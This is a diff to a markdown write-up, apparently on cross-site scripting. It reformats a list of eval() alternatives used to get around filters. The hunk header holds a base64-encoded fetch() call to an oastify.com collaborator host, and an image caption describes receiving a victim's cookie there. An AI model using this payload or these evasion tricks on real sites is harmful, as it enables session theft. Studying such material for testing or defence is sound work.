@@ -27,10 +27,10 @@ ZmV0Y2goImh0dHBzOi8vODM5Y2t0dTd1b2dlZG02YTFranV5M291dGx6Y24yYnIub2FzdGlmeS5jb20v
 + Using the **eval()** method evaluates or executes an argument. 
 + Using **atob()** or **btoa()** is function used for encoding to and from base64 formated strings.
 + If **eval()** being blocked then Alternatives:
-++ setTimeout("code")
-++ setInterval("code)
-++ setImmediate("code")
-++ Function("code")()
+  + setTimeout("code")
+  + setInterval("code)
+  + setImmediate("code")
+  + Function("code")()
   
 
 ![This image show after entering the above into search and the collaborator receiving request with base64 cookie value from us.](xss1.png)  
